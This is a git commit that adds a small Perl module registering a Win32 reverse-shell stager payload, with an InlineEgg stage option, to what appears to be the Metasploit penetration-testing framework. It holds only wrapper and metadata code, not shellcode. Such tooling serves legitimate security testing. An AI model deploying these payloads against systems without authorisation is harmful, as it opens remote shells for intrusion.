2b6b24ecaf0cb141e50ea7389fb9d8fe13e419e6
HD Moore <hd_moore@rapid7.com>
2004-03-15 07:37:21 +0000

    More inlineegg

---
+++ payloads/win32_reverse_stg_ie.pm
@@ -0,0 +1,25 @@
+package Msf::Payload::win32_reverse_stg_ie;
+use strict;
+use base 'Msf::PayloadComponent::Win32StagePayloadIE';
+sub load {
+  Msf::PayloadComponent::Win32StagePayloadIE->import('Msf::PayloadComponent::Win32ReverseStagerIE');
+}
+
+my $info =
+{
+    'Name'         => 'winreverse_stg_ie',
+    'Version'      => '1.0',
+    'Description'  => 'Listen for connection and spawn a shell',
+    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
+    'UserOpts'	   => { 'IEGG' => [1, 'PATH', 'Path to InlineEgg stage'] },
+};
+
+sub new {
+  load();
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+
+  $hash = $class->MergeHash($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
+}
